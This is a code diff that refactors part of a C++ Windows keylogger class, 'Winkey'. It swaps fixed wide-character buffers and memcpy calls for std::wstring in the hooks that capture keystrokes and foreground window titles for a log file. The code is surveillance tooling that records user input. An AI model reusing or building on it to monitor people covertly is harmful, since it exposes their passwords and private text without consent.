@@ -2,9 +2,9 @@
 
 // Declare the attributes which are used by the static methods
 std::wofstream	Winkey::_logFile;
-wchar_t			Winkey::_windowTitle[TW_WINTITLE_MAX];
+std::wstring	Winkey::_windowTitle;
+std::wstring    Winkey::_keyStroke;
 HWND		    Winkey::_currentWindow;
-wchar_t         Winkey::_keyStroke[TW_KEYSTROKE_MAX];
 
 // Check if the character is a printable unicode character
 bool Winkey::isPrintable(wchar_t c) {
@@ -96,7 +96,6 @@ void CALLBACK Winkey::winEventProc(
     LONG /*idObject*/, LONG /*idChild*/, DWORD /*dwEventThread*/, DWORD /*dwmsEventTime*/
 )
 {
-    memset(_windowTitle, 0, TW_WINTITLE_MAX);   // Reset _windowTitle
     _currentWindow = hwnd;
     if (event == EVENT_SYSTEM_FOREGROUND) {
         wchar_t windowTitle[TW_WINTITLE_MAX] = {};
@@ -113,7 +112,7 @@ void CALLBACK Winkey::winEventProc(
              * We will not use the result of GetWindowTextW to determine the length
              *  as it for some reason did truncate our final string
              */
-            memcpy(_windowTitle, windowTitle, TW_WINTITLE_MAX);
+            _windowTitle = windowTitle;
         }
     }
 }
@@ -222,12 +221,11 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
          *  the virtual key code.
          */
 
-        memset(_keyStroke, 0, TW_KEYSTROKE_MAX);  // Reset keyStroke
         if (result > 0 && isPrintable(buffer[0]))
-            memcpy(_keyStroke, buffer, TW_KEYSTROKE_MAX);
+            _keyStroke = buffer;
         else {
             std::wstring    keyName = getKeyName(p->vkCode);
-            memcpy(_keyStroke, &keyName[0], TW_KEYSTROKE_MAX);
+            _keyStroke = keyName;
         }
 
         logToFile();
